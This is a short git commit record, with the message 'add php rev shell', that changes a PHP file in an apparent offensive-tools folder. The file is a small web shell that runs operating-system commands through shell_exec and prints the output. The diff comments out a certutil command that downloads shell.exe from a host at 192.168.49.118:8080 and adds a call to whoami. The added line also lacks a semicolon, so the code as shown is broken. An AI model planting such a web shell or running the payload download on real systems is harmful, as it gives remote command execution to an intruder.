f9cdc5c5599a218d49a08e03e45c8f5c1b520fa1
Emmanuel Chen <emmanuelchen1996@hotmail.com>
2022-04-03 22:32:15 +1000

    add php rev shell

--- tools/php/cmd_execute.php
+++ tools/php/cmd_execute.php
@@ -1,5 +1,6 @@
 <?php
-$output = shell_exec('certutil -f -split -urlcache http://192.168.49.118:8080/shell.exe');
+#$output = shell_exec('certutil -f -split -urlcache http://192.168.49.118:8080/shell.exe');
+$output = shell_exec('whoami')
 echo "<pre>$output</pre>";
 ?>
 
